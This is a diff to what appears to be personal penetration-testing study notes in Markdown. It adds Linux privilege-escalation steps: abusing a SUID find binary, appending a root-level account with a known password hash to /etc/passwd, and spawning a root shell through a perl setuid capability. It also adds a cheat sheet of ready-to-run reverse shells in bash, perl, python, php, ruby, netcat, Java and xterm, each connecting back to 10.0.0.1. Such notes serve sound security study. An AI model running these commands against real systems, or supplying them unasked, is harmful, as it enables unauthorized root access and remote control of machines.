@@ -225,6 +225,10 @@ lsblk
 ```bash
 find / -perm -u=s -type f 2>/dev/null
 ```
+If S found for for ex. find
+```bash
+find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
+```
 #### Drivers and kernel modules
 ```bash
 lsmod
@@ -263,7 +267,61 @@ grep "CRON" /var/log/syslog
 ls -lah /etc/cron* # for active user
 sudo crontab -l # root
 ```
-## SHarphound BLoodhound
+### Password abusing
+Unless a centralized credential system such as Active Directory or LDAP is used, Linux passwords are generally stored in /etc/shadow, which is not readable by normal users. Historically however, password hashes, along with other account information, were stored in the world-readable file /etc/passwd. For backwards compatibility, if a password hash is present in the second column of an /etc/passwd user record, it is considered valid for authentication and it takes precedence over the respective entry in /etc/shadow, if available. This means that if we can write into /etc/passwd, we can effectively set an arbitrary password for any account.
+
+Let's demonstrate this. In a previous section, we showed that our Debian client may be vulnerable to privilege escalation because the /etc/passwd permissions were not set correctly. To escalate our privileges, let's add another superuser (root2) and the corresponding password hash to /etc/passwd. We will first generate the password hash using the openssl tool and the passwd argument. By default, if no other option is specified, openssl will generate a hash using the crypt algorithm, a supported hashing mechanism for Linux authentication.
+```bash
+openssl passwd w00t
+echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
+su root2
+```
+### Insecure system components
+#### Abusing SUID
+If theres S set for ex. find:
+```bash
+find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
+```
+#### Capabilities
+Capabilities are extra attributes that can be applied to processes, binaries, and services to assign specific privileges normally reserved for administrative operations, such as traffic capturing or adding kernel modules. Similarly to setuid binaries, if misconfigured, these capabilities could allow an attacker to elevate their privileges to root.
+Enumerate for it:
+```bash
+/usr/sbin/getcap -r / 2>/dev/null
+```
+```
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/perl = cap_setuid+ep
+/usr/bin/perl5.28.1 = cap_setuid+ep
+```
+The two perl binaries stand out as they have setuid capabilities enabled, along with the +ep flag specifying that these capabilities are effective and permitted.
+* Using GTFOBins to find instructions:
+```bash
+perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+```
+#### SUDO
+Available sudo commands for user
+```bash
+sudo -l
+```
+Example
+```
+User joe may run the following commands on debian-privesc:
+    (ALL) (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
+```
+The second command looks more promising, so let's browse GTFObins for suggestions on how to abuse it.
+SUprisingly it did not work, lets check why
+```bash
+cat /var/log/syslog | grep tcpdump
+```
+```
+Aug 29 02:52:14 debian-privesc kernel: [ 5742.171462] audit: type=1400 audit(1661759534.607:27): apparmor="DENIED" operation="exec" profile="/usr/sbin/tcpdump" name="/tmp/tmp.c5hrJ5UrsF" pid=12280 comm="tcpdump" requested_mask="x" denied_mask="x" fsuid=0 ouid=1000
+```
+App Armor! Lets check what it is protecting
+```bash
+su - root
+aa-status
+```
+## SHarphound *BLoodhound
 ### bloodhound.py
 Sharphound data collector meant for linux
 ```bash
@@ -1214,8 +1272,64 @@ First, we need to intercept the POST request via Burp and save it as a local tex
 sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
 ```
 
-# C2
+# Cheat-sheet
+## Reverse shells
+### Bash
+Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
+```bash
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+```
+### PERL
+Here’s a shorter, feature-free version of the perl-reverse-shell:
+```perl
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+### Python
+This was tested under Linux / Python 2.7:
+```python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+### PHP
+This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…
+```php
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+If you want a .php file to upload, see the more featureful and robust php-reverse-shell.
+### Ruby
+```ruby
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+```
+### Netcat
+Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.
+```bash
+nc -e /bin/sh 10.0.0.1 1234
+```
+If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+```
+### Java
+```java
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+xterm
+One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.
+```bash
+xterm -display 10.0.0.1:1
+```
+To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):
+```bash
+Xnest :1
+```
+You’ll need to authorise the target to connect to you (command also run on your host):
+```bash
+xhost +targetip
+```
 
+
+## Linux
 Przesuń o wyraz do przodu, Alt + F,Forward
 
 Przesuń o wyraz do tyłu, Alt + B,Backward
